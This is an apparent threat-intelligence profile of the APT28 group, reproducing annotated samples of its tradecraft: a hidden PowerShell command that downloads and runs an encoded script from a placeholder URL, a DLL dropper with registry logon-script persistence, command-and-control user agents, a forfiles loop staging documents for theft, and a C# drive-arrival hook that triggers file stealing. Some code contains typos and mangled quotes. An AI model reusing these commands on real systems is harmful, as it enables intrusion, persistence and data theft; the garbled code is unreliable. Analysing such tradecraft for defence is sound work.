# APT28

## Features

1. When using DDE to make Microsoft Word phishing documents, execute commands through hidden fields.

```bash
C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://Url/config.txt');
//Running PowerShell does not load configuration files, single-thread startup, does not display interactive prompts to victims and hides windows
powershell -enc $e #.EXE  
//Use the -enc option to run Base64 encoded scripts
```

This command will download a text file named config.txt from the Url address, and then call the command in the text file to execute. The content of the text file is Base64 encoded and can be decrypted using Base64.

```bash
$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”\vms.dll”);  
//Use user profile location
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$W.DownloadFile(“http://Url/media/resource/vms.dll “,$p);  
//Specify download address and download path
if (Test-Path $p){
$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;  
//Run the dll file using rundll32.exe
$p_a=$p+”,#1″;
$pr=Start-Process $rd_p -ArgumentList $p_a;
//Start the process and use the parameter as variable: $p_a;
$p_bat=($Env:ALLUSERSPROFILE+”\vms.bat”);
//Create vms.bat file
$text=’set inst_pck = “%ALLUSERSPROFILE%\vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
[io.File]::WriteAllText($p_bat,$text)
New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
//Write the contents of vms.bat file
New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
//Allow scripts to start automatically using the UserInitMprLogonScript registry key
}
```

2. The organization's command controller has used hard-coded user agent requests.

```bash
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)

Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko

Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
```

3. When stealing files, the Forfile batch command will be used to stage files.

```bash
for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (
   forfiles /P F:[REDACTED] /m *%%G /s /d +01.05.2015 /c "cmd /c copy @path
C:ProgramData[REDACTED]d@file" )
```

4. The organization's malware will install an application-defined Windows hook, which is used to obtain the Windows message of when to connect to the network drive. After adding the network drive, the hook will call the file stealing function.

```C
protected override void WndProc(ref Nessage message)  //Define callback function pointer
{
    base.WndProc(ref message);
    if (message.Msg != 537 || message.LParam == IntPtr.Zero)
    {
	return;
    }
Form1.DEV_BROADCAST_VOLUME dEV_BROADCAST_VOLUNE = (Form1.DEV_BROADCAST_VOLUNE)
//Contains information about logical volumes
    Marshal.PtrToStructure(message.LParam，typeof(Formi.DEV_BROADCAST_VOLUME));
    if (dEV_BROADCAST_vOLUME.dbcv_devicetype == 2)
    {
	int num = message.wParam.ToInt32();
	if (num != 32768)
	{
	    if (num != 32772)
	    {
		return;
	    }
	}
	else
	{
	    this.Driver = this.ToDriveName(dEv_BROADCAST_VOLUME.dbcv_unitmask);
        //Specify drive name
	    this.RecordToFile();
	}
}
```
